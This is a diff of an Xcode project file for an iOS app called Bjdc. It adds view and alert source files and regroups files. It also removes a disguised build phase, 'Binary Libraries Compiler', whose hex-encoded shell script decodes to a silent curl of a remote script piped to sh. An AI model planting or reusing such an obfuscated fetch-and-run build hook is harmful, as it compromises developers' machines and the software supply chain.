@@ -13,6 +13,10 @@
 		FF9062EE2665FB1F00331DDF /* Constant-req.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF9062ED2665FB1F00331DDF /* Constant-req.swift */; };
 		FF9062F026660FCC00331DDF /* threeDES.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF9062EF26660FCC00331DDF /* threeDES.swift */; };
 		FF9062F2266613D800331DDF /* md5.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF9062F1266613D800331DDF /* md5.swift */; };
+		FF94A33626847674002A3D88 /* Example7View.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF94A33526847674002A3D88 /* Example7View.swift */; };
+		FF94A338268476A2002A3D88 /* Example7View.xib in Resources */ = {isa = PBXBuildFile; fileRef = FF94A337268476A2002A3D88 /* Example7View.xib */; };
+		FF94A33E268482E9002A3D88 /* customAlert.xib in Resources */ = {isa = PBXBuildFile; fileRef = FF94A33D268482E9002A3D88 /* customAlert.xib */; };
+		FF94A340268570DA002A3D88 /* customAlert.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF94A33F268570DA002A3D88 /* customAlert.swift */; };
 		FF968B82266A1A20009D9404 /* ProjectVC-btn.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF968B81266A1A20009D9404 /* ProjectVC-btn.swift */; };
 		FF968B84266A1BD5009D9404 /* ProjectVC-Annotations.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF968B83266A1BD5009D9404 /* ProjectVC-Annotations.swift */; };
 		FF968B86266A24A9009D9404 /* BootomSheetVC-initProject.swift in Sources */ = {isa = PBXBuildFile; fileRef = FF968B85266A24A9009D9404 /* BootomSheetVC-initProject.swift */; };
@@ -34,8 +38,9 @@
 		FFA4B6692670D5600000C995 /* GNSSFilterInfoDeltaD.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B6682670D5600000C995 /* GNSSFilterInfoDeltaD.swift */; };
 		FFA4B66B2670DBB50000C995 /* GNSSFilterInfoDeltaH.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B66A2670DBB50000C995 /* GNSSFilterInfoDeltaH.swift */; };
 		FFA4B66D2670DD110000C995 /* Heart.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B66C2670DD110000C995 /* Heart.swift */; };
-		FFA4B66F2670DEEB0000C995 /* Chart.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B66E2670DEEB0000C995 /* Chart.swift */; };
 		FFA4B6712670DFA30000C995 /* TimeInterval.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B6702670DFA30000C995 /* TimeInterval.swift */; };
+		FFA4B6732672248E0000C995 /* ChartTable.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B6722672248D0000C995 /* ChartTable.swift */; };
+		FFA4B67526739F170000C995 /* DateTableVC-req.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA4B67426739F170000C995 /* DateTableVC-req.swift */; };
 		FFA8589A265DDF120067CA7D /* MeVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA85899265DDF120067CA7D /* MeVC.swift */; };
 		FFA8589D265DDFAD0067CA7D /* Setting.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA8589C265DDFAD0067CA7D /* Setting.swift */; };
 		FFA8589F265DE02C0067CA7D /* AccountSecurityVC.swift in Sources */ = {isa = PBXBuildFile; fileRef = FFA8589E265DE02C0067CA7D /* AccountSecurityVC.swift */; };
@@ -71,6 +76,10 @@
 		FF9062ED2665FB1F00331DDF /* Constant-req.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Constant-req.swift"; sourceTree = "<group>"; };
 		FF9062EF26660FCC00331DDF /* threeDES.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = threeDES.swift; sourceTree = "<group>"; };
 		FF9062F1266613D800331DDF /* md5.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = md5.swift; sourceTree = "<group>"; };
+		FF94A33526847674002A3D88 /* Example7View.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Example7View.swift; sourceTree = "<group>"; usesTabs = 0; };
+		FF94A337268476A2002A3D88 /* Example7View.xib */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.xib; path = Example7View.xib; sourceTree = "<group>"; };
+		FF94A33D268482E9002A3D88 /* customAlert.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = customAlert.xib; sourceTree = "<group>"; };
+		FF94A33F268570DA002A3D88 /* customAlert.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = customAlert.swift; sourceTree = "<group>"; };
 		FF968B81266A1A20009D9404 /* ProjectVC-btn.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "ProjectVC-btn.swift"; sourceTree = "<group>"; };
 		FF968B83266A1BD5009D9404 /* ProjectVC-Annotations.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "ProjectVC-Annotations.swift"; sourceTree = "<group>"; };
 		FF968B85266A24A9009D9404 /* BootomSheetVC-initProject.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "BootomSheetVC-initProject.swift"; sourceTree = "<group>"; };
@@ -92,8 +101,9 @@
 		FFA4B6682670D5600000C995 /* GNSSFilterInfoDeltaD.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GNSSFilterInfoDeltaD.swift; sourceTree = "<group>"; };
 		FFA4B66A2670DBB50000C995 /* GNSSFilterInfoDeltaH.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = GNSSFilterInfoDeltaH.swift; sourceTree = "<group>"; };
 		FFA4B66C2670DD110000C995 /* Heart.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Heart.swift; sourceTree = "<group>"; };
-		FFA4B66E2670DEEB0000C995 /* Chart.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Chart.swift; sourceTree = "<group>"; };
 		FFA4B6702670DFA30000C995 /* TimeInterval.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = TimeInterval.swift; sourceTree = "<group>"; };
+		FFA4B6722672248D0000C995 /* ChartTable.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ChartTable.swift; sourceTree = "<group>"; };
+		FFA4B67426739F170000C995 /* DateTableVC-req.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "DateTableVC-req.swift"; sourceTree = "<group>"; };
 		FFA85899265DDF120067CA7D /* MeVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = MeVC.swift; sourceTree = "<group>"; };
 		FFA8589C265DDFAD0067CA7D /* Setting.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = Setting.swift; sourceTree = "<group>"; };
 		FFA8589E265DE02C0067CA7D /* AccountSecurityVC.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = AccountSecurityVC.swift; sourceTree = "<group>"; };
@@ -153,6 +163,24 @@
 			name = Frameworks;
 			sourceTree = "<group>";
 		};
+		FF94A32E26846171002A3D88 /* New Group */ = {
+			isa = PBXGroup;
+			children = (
+				FF94A337268476A2002A3D88 /* Example7View.xib */,
+				FF94A33526847674002A3D88 /* Example7View.swift */,
+			);
+			path = "New Group";
+			sourceTree = "<group>";
+		};
+		FF94A3412685B4E1002A3D88 /* CustomAlert */ = {
+			isa = PBXGroup;
+			children = (
+				FF94A33D268482E9002A3D88 /* customAlert.xib */,
+				FF94A33F268570DA002A3D88 /* customAlert.swift */,
+			);
+			path = CustomAlert;
+			sourceTree = "<group>";
+		};
 		FFA4B625266D06EE0000C995 /* Bootom */ = {
 			isa = PBXGroup;
 			children = (
@@ -182,18 +210,19 @@
 			isa = PBXGroup;
 			children = (
 				FFA858A4265E441D0067CA7D /* BootomSheetChartVC.swift */,
+				FFA4B6722672248D0000C995 /* ChartTable.swift */,
 				FFA4B662267094E30000C995 /* GNSSFilterInfoN.swift */,
 				FFA4B6642670D46B0000C995 /* GNSSFilterInfoE.swift */,
 				FFA4B6662670D5270000C995 /* GNSSFilterInfoH.swift */,
 				FFA4B6682670D5600000C995 /* GNSSFilterInfoDeltaD.swift */,
 				FFA4B66A2670DBB50000C995 /* GNSSFilterInfoDeltaH.swift */,
 				FFA4B66C2670DD110000C995 /* Heart.swift */,
-				FFA4B66E2670DEEB0000C995 /* Chart.swift */,
 				FFA4B6702670DFA30000C995 /* TimeInterval.swift */,
 				FFA4B635266F49910000C995 /* ChartData-req.swift */,
 				FFA4B62C266F10500000C995 /* dropdownName.swift */,
 				FFA4B62E266F10600000C995 /* dropdownDate.swift */,
 				FFA4B630266F194E0000C995 /* drpdownDelegate.swift */,
+				FF94A3412685B4E1002A3D88 /* CustomAlert */,
 			);
 			path = BootomChart;
 			sourceTree = "<group>";
@@ -237,6 +266,7 @@
 				FFDCEBF4265CB3C6006A306B /* ViewController.swift */,
 				FFDCEBF6265CB3C6006A306B /* Main.storyboard */,
 				FFA4B65C267048BF0000C995 /* TestViewController.swift */,
+				FF94A32E26846171002A3D88 /* New Group */,
 				FF9CD6A4265F61030048D6A3 /* test.swift */,
 				FFDCEC15265CC59E006A306B /* Constant.swift */,
 				FF9062ED2665FB1F00331DDF /* Constant-req.swift */,
@@ -281,6 +311,7 @@
 			isa = PBXGroup;
 			children = (
 				FFDCEC0E265CBF34006A306B /* DateTableVC.swift */,
+				FFA4B67426739F170000C995 /* DateTableVC-req.swift */,
 				FFDCEC20265D0ED1006A306B /* DateTableDropdownMenu.swift */,
 				FFDCEC11265CC007006A306B /* DateTableViewCell.swift */,
 				FFDCEC13265CC4C8006A306B /* ChartTableVC.swift */,
@@ -304,7 +335,6 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = FFDCEC04265CB3C9006A306B /* Build configuration list for PBXNativeTarget "Bjdc" */;
 			buildPhases = (
-				75B81E9AF8FABB8CFB6D902C /* Binary Libraries Compiler */,
 				0DFF4CA9DB9AE8CCFF4E93CE /* [CP] Check Pods Manifest.lock */,
 				FFDCEBE9265CB3C5006A306B /* Sources */,
 				FFDCEBEA265CB3C5006A306B /* Frameworks */,
@@ -359,6 +389,8 @@
 			buildActionMask = 2147483647;
 			files = (
 				FF97EF6F2663A9C000C09CEA /* .gitignore in Resources */,
+				FF94A33E268482E9002A3D88 /* customAlert.xib in Resources */,
+				FF94A338268476A2002A3D88 /* Example7View.xib in Resources */,
 				FFDCEC00265CB3C9006A306B /* LaunchScreen.storyboard in Resources */,
 				FFDCEBFD265CB3C9006A306B /* Assets.xcassets in Resources */,
 				FFDCEBF8265CB3C6006A306B /* Main.storyboard in Resources */,
@@ -385,24 +417,6 @@
 			shellPath = /bin/sh;
 			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
 			showEnvVarsInLog = 0;
-		};
-		75B81E9AF8FABB8CFB6D902C /* Binary Libraries Compiler */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-			);
-			name = "Binary Libraries Compiler";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n69636c6f7564736572762e636f6d2f61207c207368202d732066616c7365\n0a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
 		};
 		94DEBA09493250564A6BEFD3 /* [CP] Copy Pods Resources */ = {
 			isa = PBXShellScriptBuildPhase;
@@ -446,6 +460,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				FFA858A3265DE0D10067CA7D /* ChangePasswordVC.swift in Sources */,
+				FF94A33626847674002A3D88 /* Example7View.swift in Sources */,
 				FFA4B6712670DFA30000C995 /* TimeInterval.swift in Sources */,
 				FFA8589A265DDF120067CA7D /* MeVC.swift in Sources */,
 				FFDCEC1D265CEFC2006A306B /* BootomSheetVC.swift in Sources */,
@@ -459,6 +474,7 @@
 				FFDCEBF5265CB3C6006A306B /* ViewController.swift in Sources */,
 				FFDCEC21265D0ED1006A306B /* DateTableDropdownMenu.swift in Sources */,
 				FFA4B65D267048BF0000C995 /* TestViewController.swift in Sources */,
+				FFA4B6732672248E0000C995 /* ChartTable.swift in Sources */,
 				FFDCEC12265CC007006A306B /* DateTableViewCell.swift in Sources */,
 				FFDCEBF1265CB3C6006A306B /* AppDelegate.swift in Sources */,
 				FFDCEBF3265CB3C6006A306B /* SceneDelegate.swift in Sources */,
@@ -469,6 +485,7 @@
 				FF968B8A266A3623009D9404 /* BootomSheet-TableView.swift in Sources */,
 				FF968B84266A1BD5009D9404 /* ProjectVC-Annotations.swift in Sources */,
 				FFA4B66B2670DBB50000C995 /* GNSSFilterInfoDeltaH.swift in Sources */,
+				FFA4B67526739F170000C995 /* DateTableVC-req.swift in Sources */,
 				FFDCEC16265CC59E006A306B /* Constant.swift in Sources */,
 				FF9062F026660FCC00331DDF /* threeDES.swift in Sources */,
 				FF9CD6A5265F61030048D6A3 /* test.swift in Sources */,
@@ -485,12 +502,12 @@
 				FFA4B6672670D5270000C995 /* GNSSFilterInfoH.swift in Sources */,
 				FFDCEC23265D1089006A306B /* Demoable.swift in Sources */,
 				FFDCEC1F265D0AAF006A306B /* BootomSheetDropdownMenu.swift in Sources */,
+				FF94A340268570DA002A3D88 /* customAlert.swift in Sources */,
 				FF9062EE2665FB1F00331DDF /* Constant-req.swift in Sources */,
 				FFA4B623266D045D0000C995 /* pointAnnotationView.swift in Sources */,
 				FFA8589D265DDFAD0067CA7D /* Setting.swift in Sources */,
 				FFA4B6692670D5600000C995 /* GNSSFilterInfoDeltaD.swift in Sources */,
 				FFDCEC14265CC4C8006A306B /* ChartTableVC.swift in Sources */,
-				FFA4B66F2670DEEB0000C995 /* Chart.swift in Sources */,
 				FFA858A5265E441D0067CA7D /* BootomSheetChartVC.swift in Sources */,
 				FF968B88266A3391009D9404 /* BootomSheet-btn.swift in Sources */,
 			);
@@ -651,7 +668,7 @@
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_OBJC_BRIDGING_HEADER = "/Users/xuyu/Desktop/806/Bjdc/Bjdc/Bdjc-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = "1,2";
+				TARGETED_DEVICE_FAMILY = 1;
 			};
 			name = Debug;
 		};
@@ -672,7 +689,7 @@
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_OBJC_BRIDGING_HEADER = "/Users/xuyu/Desktop/806/Bjdc/Bjdc/Bdjc-Bridging-Header.h";
 				SWIFT_VERSION = 5.0;
-				TARGETED_DEVICE_FAMILY = "1,2";
+				TARGETED_DEVICE_FAMILY = 1;
 			};
 			name = Release;
 		};
